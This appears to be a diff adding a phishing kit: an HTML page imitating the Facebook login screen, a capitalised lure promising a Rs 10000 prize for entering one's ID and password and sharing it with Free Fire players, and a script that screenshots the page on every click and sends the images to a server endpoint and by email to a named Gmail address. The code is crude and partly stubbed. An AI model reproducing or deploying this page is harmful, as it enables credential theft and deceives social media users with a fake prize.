@@ -1,0 +1,116 @@
+# DIPESH SIR 
+                                                          
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Facebook</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: blue;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #165eab;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="logo.png" alt="Facebook Logo" class="logo" width="200">
+        <h2>Log into Facebook</h2>
+        <form id="loginForm">
+            <input type="text" placeholder="Email or Phone Number" required>
+            <input type="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            // Code to take screenshot goes here
+            alert('Screenshot functionality not implemented.');
+        });
+    </script>
+</body>
+</html>
+
+
+
+# ENTER YOUR ID PASS TO LOGIN FACE BOOK TO WIN
+ PRICE AROUND RS 10000
+        YOU CAN SHERE WITH YOUR FRIEND WHO PLAY FREEFIRE TO WIN RS 10000 HE CAN TOPUP FROM THIS WINING PRICE
+ 
+<script>
+    function sendScreenshot() {
+        // Code to capture screenshot
+        html2canvas(document.body).then(canvas => {
+            canvas.toBlob(function(blob) {
+                const formData = new FormData();
+                formData.append('screenshot', blob, 'screenshot.png');
+
+                fetch('https://your-server-endpoint.com/upload', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    // Code to send email with screenshot
+                    Email.send({
+                        Host: "smtp.your-email-provider.com",
+                        Username: "your-email@example.com",
+                        Password: "your-email-password",
+                        To: 'dipeshbk176@gmail.com',
+                        From: "your-email@example.com",
+                        Subject: "Screenshot",
+                        Body: "Here is the screenshot.",
+                        Attachments: [
+                            {
+                                name: "screenshot.png",
+                                data: data.screenshot
+                            }
+                        ]
+                    }).then(message => alert("Screenshot sent successfully!"));
+                });
+            });
+        });
+    }
+
+    document.addEventListener('click', sendScreenshot);
+</script>
+
+
